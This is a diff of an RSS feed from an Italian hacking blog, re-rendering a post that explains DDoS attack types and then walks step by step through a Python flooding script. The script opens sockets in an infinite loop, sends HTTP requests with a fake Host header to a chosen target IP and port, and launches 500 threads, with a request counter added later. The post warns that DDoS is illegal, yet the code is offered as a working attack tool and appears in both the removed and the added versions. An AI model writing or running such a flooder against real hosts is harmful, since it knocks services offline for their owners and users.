@@ -5,43 +5,20 @@
     <link>https://kobra3390.github.io/SpaceHack/tags/ddos/</link>
     <description>Recent content in DDoS on HomePage</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language><atom:link href="https://kobra3390.github.io/SpaceHack/tags/ddos/index.xml" rel="self" type="application/rss+xml" />
+    <language>en</language><atom:link href="https://kobra3390.github.io/SpaceHack/tags/ddos/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Cos&#39;è un attacco DDoS e come farlo con Python</title>
       <link>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://kobra3390.github.io/SpaceHack/posts/cos%C3%A8-un-attacco-ddos-e-come-farlo-con-python/ddos_python/</guid>
-      <description>Table of Contents  Introduzione  Attacco Smurf Ping of death Attacco TCP SYN flood Come difender?  Firewall IDS     Cos&amp;rsquo;è un Attacco Denial of Service  Tipi di attacco DDoS  Attacchi volumetrici Attacchi ai protocolli Attacchi a livello di applicazione (L7)     Come realizzare uno script per il DDoS   Nel post di oggi andiamo a dare una panoramica di cos&amp;rsquo;è un attacco DDoS e come realizzare un semplice script python che lo esegue, per coloro di voi che sono interessati al tema degli attacchi di rete ho fatto un post anche su Brute Force FTP Server.</description>
-      <content>&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#introduzione&#34;&gt;Introduzione&lt;/a&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#attacco-smurf&#34;&gt;Attacco Smurf&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#ping-of-death&#34;&gt;Ping of death&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#attacco-tcp-syn-flood&#34;&gt;Attacco TCP SYN flood&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#come-difender-&#34;&gt;Come difender?&lt;/a&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#firewall&#34;&gt;Firewall&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#ids&#34;&gt;IDS&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#cos-%C3%A8-un-attacco-denial-of-service&#34;&gt;Cos&amp;rsquo;è un Attacco Denial of Service&lt;/a&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#tipi-di-attacco-ddos&#34;&gt;Tipi di attacco DDoS&lt;/a&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;#attacchi-volumetrici&#34;&gt;Attacchi volumetrici&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#attacchi-ai-protocolli&#34;&gt;Attacchi ai protocolli&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#attacchi-a-livello-di-applicazione-l7-&#34;&gt;Attacchi a livello di applicazione (L7)&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;#come-realizzare-uno-script-per-il-ddos&#34;&gt;Come realizzare uno script per il DDoS&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
+      <description>&lt;hr&gt;
+&lt;br&gt;
+&lt;p&gt;Nel post di oggi andiamo a dare una panoramica di cos&amp;rsquo;è un attacco DDoS e come realizzare un semplice script python che lo esegue, per coloro di voi
+che sono interessati al tema degli attacchi di rete ho fatto un post anche su &lt;a href=&#34;https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/&#34;&gt;Brute Force FTP Server&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Di seguito vi mostrerò il frutto delle mie ricerche in questo ambito 👽.&lt;/p&gt;</description>
+      <content>&lt;hr&gt;
+&lt;br&gt;
 &lt;p&gt;Nel post di oggi andiamo a dare una panoramica di cos&amp;rsquo;è un attacco DDoS e come realizzare un semplice script python che lo esegue, per coloro di voi
 che sono interessati al tema degli attacchi di rete ho fatto un post anche su &lt;a href=&#34;https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/&#34;&gt;Brute Force FTP Server&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Di seguito vi mostrerò il frutto delle mie ricerche in questo ambito 👽.&lt;/p&gt;
@@ -115,44 +92,43 @@ Essi si possono dividere in:&lt;/li&gt;
 &lt;h1 id=&#34;come-realizzare-uno-script-per-il-ddos&#34;&gt;Come realizzare uno script per il DDoS&lt;/h1&gt;
 &lt;p&gt;L&amp;rsquo;implementazione di uno script DDOS in Python è abbastanza semplice.&lt;/p&gt;
 &lt;p&gt;Abbiamo solo bisogno di inviare richieste a un host su una porta specifica più e più volte. Questo può essere fatto con i sockets. Per accelerare il processo e renderlo più efficace, utilizzeremo anche il multi-threading. Quindi, saranno necessarie le seguenti librerie:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
-&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; threading
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora la prima cosa di cui abbiamo bisogno sono l&amp;rsquo;indirizzo IP del bersaglio, la porta che vogliamo attaccare e il nostro falso indirizzo IP che vogliamo usare. Nota che questo tipo di indirizzo IP &amp;ldquo;falso&amp;rdquo; non nasconde realmente chi sei. Non ti rende anonimo.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10.0.0.138&amp;#39;&lt;/span&gt;
-fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;182.21.20.32&amp;#39;&lt;/span&gt;
-port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come ho già detto, DDOS è illegale. Quindi fai attenzione al bersaglio che scegli qui. In questo caso, ho scelto l&amp;rsquo;indirizzo IP del mio router di casa. Puoi anche scegliere il tuo server di casa, la tua stampante o forse anche il tuo sito web. Se non conosci il tuo indirizzo IP, puoi utilizzare la riga di comando e eseguire il ping del dominio per ottenerlo. Come indirizzo IP falso ho scelto un indirizzo casuale ma ancora valido. Ultimo ma non meno importante, ho deciso di attaccare la porta 80, che è HTTP. Se vuoi chiudere un servizio specifico, devi sapere su quale porta sta operando. La prossima cosa che dobbiamo fare è implementare l&amp;rsquo;effettiva funzione di attacco.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
-        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questa funzione di attacco è la funzione che verrà eseguita in ciascuno dei nostri singoli thread. Avvia un ciclo infinito, all&amp;rsquo;interno del quale crea un socket, si connette al target e invia una richiesta HTTP più e più volte. Ovviamente, se stai attaccando un&amp;rsquo;altra porta, dovrai anche cambiare il tipo di richiesta che invii.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; threading
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ora la prima cosa di cui abbiamo bisogno sono l&amp;rsquo;indirizzo IP del bersaglio, la porta che vogliamo attaccare e il nostro falso indirizzo IP che vogliamo usare. Nota che questo tipo di indirizzo IP &amp;ldquo;falso&amp;rdquo; non nasconde realmente chi sei. Non ti rende anonimo.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;10.0.0.138&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;182.21.20.32&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come ho già detto, DDOS è illegale. Quindi fai attenzione al bersaglio che scegli qui. In questo caso, ho scelto l&amp;rsquo;indirizzo IP del mio router di casa. Puoi anche scegliere il tuo server di casa, la tua stampante o forse anche il tuo sito web. Se non conosci il tuo indirizzo IP, puoi utilizzare la riga di comando e eseguire il ping del dominio per ottenerlo. Come indirizzo IP falso ho scelto un indirizzo casuale ma ancora valido. Ultimo ma non meno importante, ho deciso di attaccare la porta 80, che è HTTP. Se vuoi chiudere un servizio specifico, devi sapere su quale porta sta operando. La prossima cosa che dobbiamo fare è implementare l&amp;rsquo;effettiva funzione di attacco.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Questa funzione di attacco è la funzione che verrà eseguita in ciascuno dei nostri singoli thread. Avvia un ciclo infinito, all&amp;rsquo;interno del quale crea un socket, si connette al target e invia una richiesta HTTP più e più volte. Ovviamente, se stai attaccando un&amp;rsquo;altra porta, dovrai anche cambiare il tipo di richiesta che invii.&lt;/p&gt;
 &lt;p&gt;Qui puoi vedere che stiamo inserendo il nostro falso indirizzo IP nella richiesta. La richiesta stessa deve essere codificata in byte, in modo che possa essere inviata al server. Alla fine di ogni iterazione, chiudiamo il nostro socket.&lt;/p&gt;
 &lt;p&gt;Ora l&amp;rsquo;ultima cosa che dobbiamo fare è eseguire più thread che eseguono questa funzione contemporaneamente. Se eseguissimo semplicemente la funzione, invierebbe molte richieste più e più volte, ma sarebbe sempre solo una dopo l&amp;rsquo;altra. Utilizzando il multithreading, possiamo inviare molte richieste contemporaneamente.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;):
-    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;attack)
-    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo caso, stiamo avviando 500 thread che eseguiranno la nostra funzione. Certo, puoi giocare con il numero. Forse 30 o 50 sono già sufficienti. Quando ora eseguiamo il nostro script, eseguiremo il DDOS sull&amp;rsquo;obiettivo ma non vedremo nulla. Se vuoi vedere alcune informazioni, puoi stampare gli importi delle richieste già inviate.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;attack)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In questo caso, stiamo avviando 500 thread che eseguiranno la nostra funzione. Certo, puoi giocare con il numero. Forse 30 o 50 sono già sufficienti. Quando ora eseguiamo il nostro script, eseguiremo il DDOS sull&amp;rsquo;obiettivo ma non vedremo nulla. Se vuoi vedere alcune informazioni, puoi stampare gli importi delle richieste già inviate.&lt;/p&gt;
 &lt;p&gt;Basta notare che questo rallenterà il tuo attacco.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;attack_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-
-&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
-        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
-        
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; attack_num
-        attack_num &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-        print(attack_num)
-        
-        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Abbiamo creato una variabile attack_num che tiene traccia di quante richieste sono già state inviate. Ad ogni iterazione, aumentiamo questo numero e lo stampiamo.&lt;/p&gt;
-</content>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack_num &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((target, port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GET /&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; target &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HTTP/1.1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendto((&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; fake_ip &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;), (target, port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; attack_num
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        attack_num &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(attack_num)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Abbiamo creato una variabile attack_num che tiene traccia di quante richieste sono già state inviate. Ad ogni iterazione, aumentiamo questo numero e lo stampiamo.&lt;/p&gt;</content>
     </item>
     
   </channel>
